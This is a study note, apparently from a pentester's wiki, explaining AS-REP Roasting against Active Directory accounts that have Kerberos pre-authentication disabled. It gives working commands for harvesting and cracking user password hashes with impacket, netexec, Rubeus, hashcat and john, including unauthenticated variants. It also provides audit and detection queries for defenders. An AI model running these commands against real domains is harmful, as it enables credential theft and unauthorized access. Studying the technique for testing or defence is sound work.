# 📌 AS-REP Roasting

> Kerberoasting's lesser-known cousin — works **without any credentials at all** if you have a username list, because some accounts are configured to skip the proof-of-identity step in Kerberos auth.

---

## 🔍 Definition

AS-REP Roasting (MITRE T1558.004) exploits accounts where **Kerberos pre-authentication is disabled** (`DONT_REQ_PREAUTH` UAC flag). Normally, a client proves it knows the password before getting a TGT. With pre-auth disabled, the KDC will hand over an AS-REP containing an encrypted blob (TGT session key) to anyone who asks — no password needed. That blob is encrypted with the user's password hash and can be cracked offline.

**Zero-cred attack if you have usernames. Low-cred attack if you don't.**

---

## 🧠 Core Concepts

- **Pre-authentication** — default Kerberos requirement. Client must include a timestamp encrypted with its NTLM hash in the AS-REQ. Proves identity before the KDC responds with anything useful
- **DONT_REQ_PREAUTH** — UAC flag (value: `0x400000`). When set, the KDC skips the pre-auth check and returns an AS-REP to anyone who asks for that user
- **AS-REP hash** — the `enc-part` of the AS-REP is encrypted with the user's NTLM hash. Format: `$krb5asrep$23$username@DOMAIN:...` (RC4) or `$krb5asrep$18$...` (AES256)
- **Hashcat mode 18200** — mode for AS-REP Roasting hashes (etype 23/RC4)
- **No lockout** — completely offline cracking. KDC has already served its purpose
- **Pre-auth type 0** — the log indicator in Event ID 4768. Pre-auth type = 0 means it was disabled. Primary blue team detection signal
- **Unauthenticated variant** — if LDAP null session is allowed OR you have a username list, no domain creds needed at all
- **Authenticated variant** — with creds, GetNPUsers queries LDAP for all accounts with `DONT_REQ_PREAUTH` automatically

---

## ⚙️ How It Works

**Normal Kerberos AS exchange:**
1. Client → KDC: AS-REQ with timestamp encrypted with user's NTLM hash (pre-auth)
2. KDC decrypts, verifies identity → issues TGT
3. Client can't get anything useful without knowing the password

**AS-REP Roasting flow:**
1. Attacker → KDC: AS-REQ for `victim_user` with **no pre-auth data** (or pre-auth skipped by KDC)
2. KDC issues AS-REP because `DONT_REQ_PREAUTH` is set on that account
3. AS-REP contains the session key encrypted with victim's NTLM hash
4. Attacker extracts `$krb5asrep$23$victim_user@DOMAIN:...` and cracks offline

> 💡 The KDC is just doing what it's configured to do. The misconfiguration is the `DONT_REQ_PREAUTH` flag — often set by sysadmins for legacy apps that "don't support Kerberos pre-authentication."

---

## 📖 Key Terminology

| Term | Meaning |
|------|---------|
| AS-REQ | Authentication Service Request — client's first message to KDC |
| AS-REP | Authentication Service Reply — KDC's response containing TGT + session key |
| DONT_REQ_PREAUTH | UAC flag disabling pre-authentication for an account |
| `$krb5asrep$23$` | RC4-encrypted AS-REP hash — hashcat mode 18200 |
| `$krb5asrep$18$` | AES256-encrypted AS-REP hash — hashcat mode 19900 |
| Event ID 4768 | Kerberos AS ticket requested — logged on DC. Pre-auth type = 0 = vulnerable account used |
| GetNPUsers.py | Impacket script for AS-REP Roasting. "NP" = No Pre-auth |
| Kerbrute | Can perform AS-REP Roasting alongside username enumeration |

---

## 🔥 Important Details & Gotchas

- **Pre-auth is enabled by default** — this is a deliberate misconfiguration. It's never set automatically; someone turned it off
- **Check descriptions** — accounts with `DONT_REQ_PREAUTH` are sometimes poorly documented service accounts. Their description field may contain the password
- **RC4 vs AES** — like Kerberoasting, RC4 cracks ~100x faster. Most tools default to requesting RC4. Check if AES-only is enforced before spending GPU time
- **Username-only attack** — unlike Kerberoasting (needs any valid domain cred), AS-REP Roasting can run with just a username list + network access to port 88. You can get this list via null session, Kerbrute user enum, or LinkedIn scraping
- **Detection is simpler** than Kerberoasting — Event ID 4768 with pre-auth type = 0 is a strong signal. Less traffic to generate suspicion
- **HTB Forest machine** — canonical example. `svc-alfresco` has pre-auth disabled. Get the hash → crack it → foothold → escalate to DA via `WriteDACL`

---

## 🌍 Real-World Usage / Examples

**Unauthenticated (username list only):**
```bash
# GetNPUsers — no creds, just usernames
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC-IP> \
  -no-pass -format hashcat -outputfile asrep.hashes

# Filter out errors
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip <DC-IP> \
  -no-pass -format hashcat | grep krb5asrep
```

**Authenticated (auto-queries LDAP for vulnerable accounts):**
```bash
impacket-GetNPUsers corp.local/user:pass -dc-ip <DC-IP> \
  -request -format hashcat -outputfile asrep.hashes

# With hash instead of password
impacket-GetNPUsers corp.local/user -hashes :ntlmhash -dc-ip <DC-IP> \
  -request -format hashcat
```

**Netexec:**
```bash
nxc ldap <DC-IP> -u user -p pass --asreproast asrep.hashes --kdcHost <DC-IP>
nxc ldap <DC-IP> -u '' -p '' --asreproast asrep.hashes   # null session attempt
```

**Rubeus (Windows):**
```cmd
# All accounts without pre-auth
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.hashes

# Specific user
.\Rubeus.exe asreproast /user:svc_alfresco /format:hashcat
```

**Crack the hash:**
```bash
# RC4 (etype 23) → hashcat mode 18200
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# AES256 (etype 18) → hashcat mode 19900
hashcat -m 19900 asrep.hashes /usr/share/wordlists/rockyou.txt

# John alternative
john --format=krb5asrep asrep.hashes --wordlist=/usr/share/wordlists/rockyou.txt
```

**Find vulnerable accounts (PowerShell — blue team audit):**
```powershell
Get-ADUser -Filter * -Properties DoesNotRequirePreAuth |
  Where-Object { $_.DoesNotRequirePreAuth -eq $True -and $_.Enabled -eq $True } |
  Select-Object SamAccountName, DistinguishedName

# LDAP query equivalent
ldapsearch -x -H ldap://<DC-IP> -D "corp\user" -w "pass" \
  -b "DC=corp,DC=local" \
  "(userAccountControl:1.2.840.113556.1.4.803:=4194304)" sAMAccountName
```

**Detection query (Splunk/SIEM):**
```
EventID=4768 AND PreAuthType=0 AND ServiceName=krbtgt
```

---

## 🔗 Related Topics

- [[Kerberos Authentication]]
- [[Kerberoasting Deep Dive]]
- [[Active Directory (AD)]]
- [[LDAP Enumeration]]
- [[BloodHound & Attack Path Analysis]]
- [[Lateral Movement]]

---

## 📚 Sources / Further Reading

- [The Hacker Recipes — ASREProast](https://www.thehacker.recipes/ad/movement/kerberos/asreproast) — clean command reference
- [HackTricks — AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/as-rep-roasting) — multi-tool examples
- [HTB Blog — AS-REP Roasting Detection](https://www.hackthebox.com/blog/as-rep-roasting-detection) — detection signals breakdown
- [Pentestlab.blog — AS-REP Roasting (Feb 2024)](https://pentestlab.blog/2024/02/20/as-rep-roasting/) — illustrated walkthrough
- HTB Machine: `Forest` (canonical AS-REP → DA path)
- MITRE ATT&CK: T1558.004
